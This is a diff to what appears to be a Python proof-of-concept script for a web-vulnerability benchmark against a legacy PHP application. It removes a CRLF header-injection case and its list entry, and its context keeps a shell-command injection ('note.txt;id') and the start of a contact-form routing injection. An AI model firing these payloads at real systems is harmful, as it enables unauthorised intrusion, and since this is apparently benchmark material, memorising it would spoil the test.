@@ -290,11 +290,6 @@ def poc_0013() -> None:
     user.get(raw_query("/account/documents.php", "preview=" + q("note.txt;id")))
 
 
-def poc_0014() -> None:
-    """A second header field carried into the response header block."""
-    anon.get(raw_query("/go.php", "to=catalogue&ref=" + q("BT-4471\r\nX-Cache-Note: split")))
-
-
 def poc_0015() -> None:
     """A second routing field carried into the queued message."""
     anon.post("/contact.php", {
@@ -404,7 +399,7 @@ POCS = [
     ("BENCH-LEGY-0004", poc_0004), ("BENCH-LEGY-0005", poc_0005), ("BENCH-LEGY-0006", poc_0006),
     ("BENCH-LEGY-0007", poc_0007), ("BENCH-LEGY-0008", poc_0008), ("BENCH-LEGY-0009", poc_0009),
     ("BENCH-LEGY-0010", poc_0010), ("BENCH-LEGY-0011", poc_0011), ("BENCH-LEGY-0012", poc_0012),
-    ("BENCH-LEGY-0013", poc_0013), ("BENCH-LEGY-0014", poc_0014), ("BENCH-LEGY-0015", poc_0015),
+    ("BENCH-LEGY-0013", poc_0013), ("BENCH-LEGY-0015", poc_0015),
     ("BENCH-LEGY-0016", poc_0016), ("BENCH-LEGY-0017", poc_0017), ("BENCH-LEGY-0018", poc_0018),
     ("BENCH-LEGY-0019", poc_0019), ("BENCH-LEGY-0020", poc_0020), ("BENCH-LEGY-0021", poc_0021),
     ("BENCH-LEGY-0022", poc_0022), ("BENCH-LEGY-0023", poc_0023), ("BENCH-LEGY-0024", poc_0024),
